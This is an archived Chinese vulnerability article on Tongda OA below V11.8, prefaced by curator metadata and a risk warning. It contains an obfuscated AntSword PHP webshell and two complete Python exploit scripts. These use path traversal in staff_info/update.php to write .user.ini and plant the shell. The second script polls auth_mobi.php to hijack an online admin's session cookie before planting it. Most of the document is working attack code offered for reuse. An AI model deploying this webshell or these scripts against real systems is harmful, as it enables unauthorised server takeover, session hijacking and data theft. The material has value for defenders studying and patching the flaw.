---
source: "MrWQ/vulnerability-paper"
title: "通达OA staff_info/update路径写入.user.ini并与auth_mobi会话泄露组合"
product: "通达OA"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "文称V11.8以下，标题11.8；链前置auth_mobi限11.7；需PHP支持.user.ini及create_function"
prerequisites: "后台Cookie；链需目标用户在线"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/5TxJ_4rEPvMyjU3KVflkbQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%28%E8%A1%A5%E5%85%85%29%20%E9%80%9A%E8%BE%BE%20OA%20v11-8%20%E5%AD%98%E5%82%A8%E5%9E%8B%20XSS%20%E4%B8%8E%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
category_recommendation: "OA / 通达"
id: "vw-a5337bab2d500376ff000685"
entity_id: "ve-a5337bab2d500376ff000685"
schema_version: "1"
---

# 通达OA staff_info/update路径写入.user.ini并与auth_mobi会话泄露组合

## 条目说明

- 对象与具体问题：通达OA；staff_info/update路径写入.user.ini并与auth_mobi会话泄露组合
- 版本、配置及部署条件：文称V11.8以下，标题11.8；链前置auth_mobi限11.7；需PHP支持.user.ini及create_function
- 认证与权限前提：后台Cookie；链需目标用户在线
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题存储XSS但本文是文件写入补充，无XSS入口；应关联前篇而非独立XSS实体
- 脚本硬编码会话，示例路由混合斜线，缺受影响版本边界及修复依据
- 两段大量重复上传代码可整合；循环等待会话、植入Webshell须隔离示例
- 最终URL无需登录不等于初始上传无需认证；需明确链条件

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5TxJ_4rEPvMyjU3KVflkbQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

前一篇文章简单介绍了利用方法，但 v11.7 与 v11.8 Webshell 命令无法执行  

昨天收到了来自 Russell 师傅的建议，上传蚁剑可连接的 Webshell 控制服务器  

并可以配合之前的通达 OA v11.7 的任意在线用户 Cookie 泄露来进一步渗透

**二:  漏洞影响🐇**

**通达 0A V11.8 以下**

**三:  漏洞复现🐋**

**蚁剑的 webshell 为**

```
<?php 
echo "PeiQi_Wiki";
$fOgT=create_function(base64_decode('JA==').chr(114195/993).str_rot13('b').str_rot13('z').chr(708-607),chr(0xc60e/0x1f6).base64_decode('dg==').str_rot13('n').chr(390-282).chr(0x1ae-0x186).chr(0x3ac-0x388).chr(0xd561/0x1db).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ==').str_rot13(')').chr(798-739));$fOgT(base64_decode('OTM2N'.'DM3O0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').chr(41382/726).str_rot13('G').base64_decode('Vg==').''.''.base64_decode('Rg==').str_rot13('g').str_rot13('D').base64_decode('Wg==').chr(23751/273).''.'lRaV0'.'pOzI4'.'MDkzM'.'TE7'.''));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXBQiaLY6vMhiaOC5NWayXOR9P0xqmgqUpVdgvOMuCUOiaKJnfpZUnic226Q/640?wx_fmt=png)

**上传 .user.ini 再上传 peiqi.log 后访问 URL 出现 PeiQi_Wiki 就是成功上传了**

```
http://192.168.1.103/general/reportshop/workshop/report/attachment-remark/form.inc.php?
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXhl9DMrFdbmu7Ib2naUic4fMuN6Xp5IZ7uxt1TibD28eicN88617viaAYyA/640?wx_fmt=png)

使用蚁剑连接 密码为 PeiQi (Url 访问无需登录，可直接远程连接)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXC1IuSsBuLqPfyEtsVdicZsG8EP6XaibmWLBJ9oVJxWFgDYQ4vu7P0bEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXKIWJukHdWibtW7jSibrUkP6mGhWahVjKTicBGTSrhiazg44aNBbqKExNJg/640?wx_fmt=png)

**这里重新写了一个 EXP，为蚁剑 Webshell 上传 EXP（文末获取）**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXiae4RiaeNGdP3X7PjVfjFXibs1QF103Y131c76J9PxmEnGqz1vn7SyPvQ/640?wx_fmt=png)

**配合 之前的通达 OA v11.7 以下的在线用户 Cookie 泄露**

**一旦用户登录 OA 系统时就主动上传 Webshell**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXarSzexOYwe2nZ7lZUBC8IZibhHlsUYXfDcIwJL9cnQs6jpjfXxC75bg/640?wx_fmt=png)

****四:  漏洞 POC🦉****

```
https://github.com/PeiQi0/PeiQi-WIKI-POC
目前POC已经全部上传到Github
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXH5Dc2zLKmekCoib4e1nNDiczwo1pfqicy7tdxfkCsJM9kmPQgTF6tP41Q/640?wx_fmt=png)

**蚁剑后台文件上传  
**

```
import requests
import sys
import random
import re
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \033[0m".format(target_url))
            print("\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\033[0m".format(target_url))

        else:
            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Cookie = "PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin"
    POC_1(target_url, Cookie)
```

**登录 Cookie 泄露配合后台文件上传  
**

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_0(target_url):
    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "RELOGIN" in response.text and response.status_code == 200:
            print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))
        elif response.status_code == 200 and response.text == "":
            Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(Cookie[0] ,time.asctime(time.localtime(time.time()))))
            Cookie = "PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin".format(Cookie[0])
            POC_1(target_url, Cookie)
        else:
            print("\033[31m[x] 请求失败，目标可能不存在漏洞")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \033[0m".format(target_url))
            print("\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\033[0m".format(target_url))
            sys.exit(0)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    while True:
        POC_0(target_url)
        time.sleep(5)
```

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在公众号
> 
> 别忘了 Github 下载完给个小星星⭐

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
